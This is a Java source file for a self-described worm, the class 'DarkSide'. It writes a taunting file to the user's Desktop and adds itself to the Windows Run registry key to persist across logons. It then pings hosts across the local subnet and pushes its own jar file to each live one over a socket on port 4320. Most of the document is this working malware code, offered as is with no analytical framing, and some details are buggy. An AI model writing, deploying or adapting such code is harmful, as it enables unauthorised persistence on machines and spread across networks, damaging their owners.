package worm;

import com.sun.jna.platform.win32.Advapi32Util;
import com.sun.jna.platform.win32.Win32Exception;
import com.sun.jna.platform.win32.WinReg;

import java.io.*;
import java.net.InetAddress;
import java.net.Socket;
import java.net.UnknownHostException;

public class DarkSide {
    private String desktopPath;
    private String wormPath;

    private DarkSide() {
        desktopPath = System.getProperty("user.home") + "/Desktop";
        try {
            wormPath = Advapi32Util.registryGetStringValue(WinReg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "THIS IS A WORM");
        } catch (Win32Exception exception) {
            wormPath = null;
        }
        infect(wormPath == null || wormPath.isEmpty());
        spread();
    }

    private boolean infect(boolean forced) {
        File text = new File(desktopPath, "worm-text.txt");
        System.out.println("Infected!");
        try {
            if (!text.createNewFile() && !forced) return false;
            BufferedWriter bw = new BufferedWriter(new FileWriter(text));
            bw.write("May the force be with you!");
            bw.newLine();
            bw.write("Taste the darkness!");
            bw.newLine();
            bw.write("Fear the darkness! (And the Walking Dead)");
            bw.flush();

            bw.close();
        } catch (IOException e) {
            e.printStackTrace();
        }

        String value =
                        "\"javaw -jar " +
                        System.getProperty("user.dir") +
                        "\\" +
                        new File(DarkSide.class.getProtectionDomain().getCodeSource()
                        .getLocation()
                        .getPath())
                        .getName() +
                        "\"";

        Advapi32Util.registrySetStringValue(WinReg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "THIS IS A WORM", value);
        wormPath = Advapi32Util.registryGetStringValue(WinReg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "THIS IS A WORM");
        return true;
    }

    private void spread() {

        try {
            String hostAddress = InetAddress.getLocalHost().getHostAddress();

            String gateway = hostAddress.substring(0, hostAddress.lastIndexOf(".")) + ".";
            System.out.println(gateway + "1");

            wormPath = new File(DarkSide.class.getProtectionDomain().getCodeSource()
                    .getLocation()
                    .getPath())
                    .getName();

            for (int i = 2; i < 225; i++) {
                String ip = gateway + Integer.toString(i);
                new InfectionThread(ip).start();
            }

        } catch (UnknownHostException e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] params) {
        new DarkSide();
    }

    private class InfectionThread extends Thread {
        private String ip;

        InfectionThread(String ip) {
            this.ip = ip;
        }

        public void run() {
            if (ip == null) return;

            try {
                Process process = Runtime.getRuntime().exec("ping.exe " + ip);

                int val = process.waitFor();
                if (val != 0) {
                    System.out.println(ip + ": is not alive");
                    return;
                }

                System.out.println(ip + ": is not alive");

                infectMachineTOne(ip);

            } catch (IOException | InterruptedException e) {
                e.printStackTrace();
            }
        }

        private void infectMachineTOne(String address) throws IOException {
            File file = new File(wormPath);
            System.out.println(file.exists());
            if (!file.exists()) return;

            Socket socket = new Socket(address, 4320);

            byte[] cbuffer = new byte[1024];
            int bytesRead;

            FileInputStream fileIn = new FileInputStream(file);
            OutputStream outputStream = socket.getOutputStream();

            while ((bytesRead = fileIn.read(cbuffer)) != -1) {
                outputStream.write(cbuffer, 0, bytesRead);
                outputStream.flush();
            }
            System.out.println("File Sent");
            fileIn.close();
        }
    }
}
